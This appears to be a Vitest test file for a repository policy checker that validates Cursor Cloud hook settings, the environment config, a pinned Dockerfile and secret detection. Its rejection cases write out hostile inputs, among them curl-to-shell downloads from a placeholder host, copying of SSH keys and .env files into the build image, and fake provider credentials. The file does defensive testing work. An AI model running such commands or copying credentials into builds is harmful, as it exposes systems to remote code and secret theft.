import { readFile } from "node:fs/promises";
import path from "node:path";
import { describe, expect, it } from "vitest";
import * as repositoryPolicy from "../tools/repository-policy.mjs";
import {
  containsPotentialSecret,
  validateCursorEnvironmentPolicy,
  validateCursorHookPolicy,
  validateRepository,
} from "../tools/repository-policy.mjs";

const validCursorEnvironment = {
  build: { dockerfile: "Dockerfile", context: ".." },
  install: "npm ci && npm exec -- playwright install --with-deps chromium && npm run cursor:doctor -- --build",
  start: "sudo service docker start",
};

const validCursorDockerfile = `FROM node:24.13.0-bookworm

RUN apt-get update \\
    && apt-get install -y --no-install-recommends \\
      ca-certificates \\
      curl \\
      docker.io \\
      git \\
      ripgrep \\
    && npm install --global npm@11.6.2 \\
    && rm -rf /var/lib/apt/lists/*
`;

function cursorEnvironmentErrors(overrides = {}) {
  return validateCursorEnvironmentPolicy({
    environmentConfig: structuredClone(validCursorEnvironment),
    dockerfile: validCursorDockerfile,
    packageJson: {
      scripts: {
        "cursor:doctor": "node tools/cursor-cloud-doctor.mjs",
        check: "npm run policy && npm test",
      },
    },
    ...overrides,
  });
}

const validHookConfig = {
  version: 1,
  hooks: Object.fromEntries([
    "preToolUse",
    "beforeShellExecution",
    "subagentStart",
    "subagentStop",
    "afterFileEdit",
  ].map((event) => [event, [{
    type: "command",
    command: "node tools/guard-cursor-hook.mjs",
    timeout: 10,
    failClosed: true,
  }]])),
};

const validAgentsConfig = {
  cursor: {
    families: ["openai", "anthropic"],
    roles: [
      { slug: "consultant" },
      { slug: "change-evaluator" },
      { slug: "supabase-auditor" },
    ],
  },
};

const validExecutionPolicy = {
  modelFamilies: {
    openai: ["^gpt-5\\.6-(?:sol|terra|luna)$"],
    anthropic: ["^claude-(?:opus|sonnet|fable)-5$"],
  },
  cursorModels: {
    openai: "gpt-5.6-sol[effort=high]",
    anthropic: "claude-opus-5[effort=high]",
  },
};

const validCursorAgents = [
  "change-evaluator-anthropic.md",
  "change-evaluator-openai.md",
  "consultant-anthropic.md",
  "consultant-openai.md",
  "supabase-auditor-anthropic.md",
  "supabase-auditor-openai.md",
];

const validCursorAgentContents = Object.fromEntries(validCursorAgents.map((filename) => {
  const name = filename.replace(/\.md$/u, "");
  const family = name.endsWith("-openai") ? "openai" : "anthropic";
  const model = family === "openai" ? "gpt-5.6-sol[effort=high]" : "claude-opus-5[effort=high]";
  return [filename, `---\nname: ${name}\nmodel: ${model}\nreadonly: true\nis_background: false\n---\n\nCanonical contract.\n`];
}));

function cursorPolicyErrors(overrides = {}) {
  return validateCursorHookPolicy({
    hooksConfig: structuredClone(validHookConfig),
    packageJson: { scripts: { "cursor:hook-check": "node tools/guard-cursor-hook.mjs --check" } },
    agentsConfig: structuredClone(validAgentsConfig),
    executionPolicy: structuredClone(validExecutionPolicy),
    cursorAgentFiles: [...validCursorAgents],
    cursorAgentContents: structuredClone(validCursorAgentContents),
    ...overrides,
  });
}

describe("repository policy", () => {
  it("keeps required policy, ownership, agent, and secret boundaries valid", async () => {
    await expect(validateRepository(path.resolve("."))).resolves.toEqual([]);
  });

  it("detects representative provider credentials without flagging placeholders", () => {
    const credentials = [
      ["github", "_pat_", "11_AAA", "A".repeat(40)].join(""),
      ["gh", "p_", "A".repeat(36)].join(""),
      ["AS", "IA", "1".repeat(16)].join(""),
      ["AWS_SECRET_ACCESS_KEY", "=", "s".repeat(40)].join(""),
      ["-----BEGIN PRIVATE", " KEY-----"].join(""),
      ["sb", "p_", "a".repeat(24)].join(""),
      ["sb", "_secret_", "a".repeat(24)].join(""),
      ["SUPABASE_SERVICE_ROLE_KEY", "=", "eyJ", "a".repeat(20), ".", "b".repeat(20), ".", "c".repeat(20)].join(""),
      ["VERCEL_TOKEN", "=", "v".repeat(32)].join(""),
      ["CLOUDFLARE_API_TOKEN", "=", "c".repeat(40)].join(""),
      ["CLOUDFLARE_GLOBAL_API_KEY", "=", "d".repeat(40)].join(""),
    ];
    for (const credential of credentials) expect(containsPotentialSecret(credential), credential.slice(0, 12)).toBe(true);

    expect(containsPotentialSecret("SUPABASE_SERVICE_ROLE_KEY=replace-me")).toBe(false);
    expect(containsPotentialSecret(JSON.stringify({
      supabase: { projectRef: "abcdefghijklmnopqrst", publishableKey: ["sb", "_publishable_", "public-example"].join("") },
      vercel: { scope: "team_public", projectId: "prj_public" },
      cloudflare: { accountId: "a".repeat(32), zoneId: "b".repeat(32) },
    }))).toBe(false);
  });

  it("requires durable Cursor operator authority and an accepted narrow D-003 supersession", async () => {
    const [authority, decisions] = await Promise.all([
      readFile(path.resolve("docs/authority.md"), "utf8"),
      readFile(path.resolve("specs/decisions.md"), "utf8"),
    ]);

    expect(repositoryPolicy.validateCursorAuthorityDocumentation({ authority, decisions })).toEqual([]);
  });

  it("accepts only the five finite fail-closed Cursor Cloud command hooks", () => {
    expect(cursorPolicyErrors()).toEqual([]);

    const notFailClosed = structuredClone(validHookConfig);
    notFailClosed.hooks.preToolUse[0].failClosed = false;
    expect(cursorPolicyErrors({ hooksConfig: notFailClosed })).toContain(
      "Cursor hook preToolUse must be a finite fail-closed project command.",
    );

    const noTimeout = structuredClone(validHookConfig);
    delete noTimeout.hooks.beforeShellExecution[0].timeout;
    expect(cursorPolicyErrors({ hooksConfig: noTimeout })).toContain(
      "Cursor hook beforeShellExecution must be a finite fail-closed project command.",
    );

    const promptHook = structuredClone(validHookConfig);
    promptHook.hooks.subagentStart[0].type = "prompt";
    expect(cursorPolicyErrors({ hooksConfig: promptHook })).toContain(
      "Cursor hook subagentStart must be a finite fail-closed project command.",
    );
  });

  it("rejects non-root commands, unsupported Cloud MCP hooks, and credential values", () => {
    const absoluteCommand = structuredClone(validHookConfig);
    absoluteCommand.hooks.afterFileEdit[0].command = "/tmp/guard-cursor-hook.mjs";
    expect(cursorPolicyErrors({ hooksConfig: absoluteCommand })).toContain(
      "Cursor hook afterFileEdit must be a finite fail-closed project command.",
    );

    const unsupportedMcpHook = structuredClone(validHookConfig);
    unsupportedMcpHook.hooks.beforeMCPExecution = structuredClone(validHookConfig.hooks.preToolUse);
    expect(cursorPolicyErrors({ hooksConfig: unsupportedMcpHook })).toContain(
      "Cursor Cloud project hooks must not claim unsupported hook coverage.",
    );

    const credentialConfig = structuredClone(validHookConfig);
    credentialConfig.hooks.preToolUse[0].command += ` ${["ghp", "_123456789012345678901234567890"].join("")}`;
    expect(cursorPolicyErrors({ hooksConfig: credentialConfig })).toContain(
      "Cursor hook configuration must not contain credential values.",
    );
  });

  it("requires generated Cursor agent parity and the deterministic hook check", () => {
    expect(cursorPolicyErrors({ cursorAgentFiles: validCursorAgents.slice(1) })).toContain(
      ".cursor/agents must contain exactly the generated Cursor agent set.",
    );
    expect(cursorPolicyErrors({
      packageJson: { scripts: { "cursor:hook-check": "node tools/guard-cursor-hook.mjs" } },
    })).toContain("package.json must expose the deterministic Cursor hook check.");
    expect(cursorPolicyErrors({
      packageJson: { scripts: { "cursor:hook-check": "echo $TOKEN | node tools/guard-cursor-hook.mjs" } },
    })).toContain("package.json must expose the deterministic Cursor hook check.");
  });

  it("rejects empty, missing, extra, and noncanonical Cursor role or family policy", () => {
    for (const cursor of [
      { families: [], roles: [] },
      { families: ["openai"], roles: structuredClone(validAgentsConfig.cursor.roles) },
      { families: ["openai", "anthropic", "cursor"], roles: structuredClone(validAgentsConfig.cursor.roles) },
      { families: ["openai", "anthropic"], roles: [] },
      { families: ["openai", "anthropic"], roles: [{ slug: "consultant" }, { slug: "change-evaluator" }] },
      { families: ["openai", "anthropic"], roles: [...structuredClone(validAgentsConfig.cursor.roles), { slug: "general-purpose" }] },
    ]) {
      expect(cursorPolicyErrors({ agentsConfig: { cursor } })).toContain(
        "Cursor agent roles and families must match the canonical nonempty sets.",
      );
    }
    expect(cursorPolicyErrors({
      agentsConfig: { cursor: { families: [], roles: [] } },
      cursorAgentFiles: [],
      cursorAgentContents: {},
    })).toContain(".cursor/agents must contain exactly the generated Cursor agent set.");
  });

  it("rejects configured model family mismatch and generated frontmatter drift", () => {
    const mismatchedModels = structuredClone(validExecutionPolicy);
    mismatchedModels.cursorModels.openai = "claude-opus-5[effort=high]";
    expect(cursorPolicyErrors({ executionPolicy: mismatchedModels })).toContain(
      "Cursor configured models must match their canonical families.",
    );

    const writableAgent = structuredClone(validCursorAgentContents);
    writableAgent["change-evaluator-openai.md"] = writableAgent["change-evaluator-openai.md"].replace(
      "readonly: true",
      "readonly: false",
    );
    expect(cursorPolicyErrors({ cursorAgentContents: writableAgent })).toContain(
      ".cursor/agents content must preserve canonical name, model, and readonly frontmatter.",
    );

    const wrongModelAgent = structuredClone(validCursorAgentContents);
    wrongModelAgent["consultant-anthropic.md"] = wrongModelAgent["consultant-anthropic.md"].replace(
      "claude-opus-5[effort=high]",
      "gpt-5.6-sol[effort=high]",
    );
    expect(cursorPolicyErrors({ cursorAgentContents: wrongModelAgent })).toContain(
      ".cursor/agents content must preserve canonical name, model, and readonly frontmatter.",
    );
  });

  it("requires the exact Cursor Cloud environment and deterministic doctor script", () => {
    expect(cursorEnvironmentErrors()).toEqual([]);

    const extra = structuredClone(validCursorEnvironment);
    extra.secrets = {};
    expect(cursorEnvironmentErrors({ environmentConfig: extra })).toContain(
      ".cursor/environment.json must contain only the exact build, install, and start contract.",
    );

    const changedInstall = structuredClone(validCursorEnvironment);
    changedInstall.install = "npm install && npm run cursor:doctor -- --build";
    expect(cursorEnvironmentErrors({ environmentConfig: changedInstall })).toContain(
      ".cursor/environment.json must contain only the exact build, install, and start contract.",
    );

    expect(cursorEnvironmentErrors({
      packageJson: { scripts: { "cursor:doctor": "node tools/cursor-cloud-doctor.mjs --activation-input evidence.json" } },
    })).toContain("package.json must expose the non-activating Cursor Cloud doctor.");
  });

  it("rejects repository, environment, credential, and home content in the Build image", () => {
    for (const dockerfile of [
      `${validCursorDockerfile}\nCOPY . /workspace\n`,
      `${validCursorDockerfile}\nADD .env.local /tmp/.env.local\n`,
      `${validCursorDockerfile}\nCOPY /home/user/.config /opt/config\n`,
      `${validCursorDockerfile}\nCOPY /root/.ssh /opt/ssh\n`,
      `${validCursorDockerfile}\nARG GITHUB_TOKEN\n`,
      `${validCursorDockerfile}\nENV API_SECRET=replace-me\n`,
    ]) {
      expect(cursorEnvironmentErrors({ dockerfile })).toContain(
        ".cursor/Dockerfile must exactly match the canonical public toolchain definition.",
      );
    }
  });

  it("requires exact public toolchains, a pinned npm, apt cleanup, and no shell downloads", () => {
    expect(cursorEnvironmentErrors({
      dockerfile: validCursorDockerfile.replace("node:24.13.0-bookworm", "node:24-bookworm"),
    })).toContain(".cursor/Dockerfile must exactly match the canonical public toolchain definition.");
    expect(cursorEnvironmentErrors({
      dockerfile: validCursorDockerfile.replace("      ripgrep \\\n", ""),
    })).toContain(".cursor/Dockerfile must exactly match the canonical public toolchain definition.");
    expect(cursorEnvironmentErrors({
      dockerfile: validCursorDockerfile.replace("npm@11.6.2", "npm"),
    })).toContain(".cursor/Dockerfile must exactly match the canonical public toolchain definition.");
    expect(cursorEnvironmentErrors({
      dockerfile: validCursorDockerfile.replace("    && rm -rf /var/lib/apt/lists/*\n", ""),
    })).toContain(".cursor/Dockerfile must exactly match the canonical public toolchain definition.");
    expect(cursorEnvironmentErrors({
      dockerfile: `${validCursorDockerfile}\nRUN curl https://example.invalid/install.sh | sh\n`,
    })).toContain(".cursor/Dockerfile must exactly match the canonical public toolchain definition.");
    expect(cursorEnvironmentErrors({
      dockerfile: `${validCursorDockerfile}\nRUN curl https://example.invalid/install.sh -o /tmp/install.sh && sh /tmp/install.sh\n`,
    })).toContain(".cursor/Dockerfile must exactly match the canonical public toolchain definition.");
  });

  it("rejects every Dockerfile command appended outside the canonical public Build", () => {
    expect(cursorEnvironmentErrors({ dockerfile: validCursorDockerfile.trimEnd() })).toEqual([]);
    for (const dockerfile of [
      `${validCursorDockerfile}\nRUN true; curl https://example.invalid/install.sh -o /tmp/install.sh; sh /tmp/install.sh\n`,
      `${validCursorDockerfile}\nRUN env SAFE=1 curl https://example.invalid/install.sh | sh\n`,
      `${validCursorDockerfile}\nRUN corepack pnpm add --global arbitrary-package\n`,
      `${validCursorDockerfile}\nRUN echo build-complete\n`,
    ]) {
      expect(cursorEnvironmentErrors({ dockerfile })).toContain(
        ".cursor/Dockerfile must exactly match the canonical public toolchain definition.",
      );
    }
  });

  it("rejects secret-shaped Cursor environment JSON even when nested", () => {
    const withSecret = structuredClone(validCursorEnvironment);
    withSecret.build.token = ["ghp", "_123456789012345678901234567890"].join("");
    expect(cursorEnvironmentErrors({ environmentConfig: withSecret })).toContain(
      ".cursor/environment.json must not contain secret-shaped fields or values.",
    );
  });
});
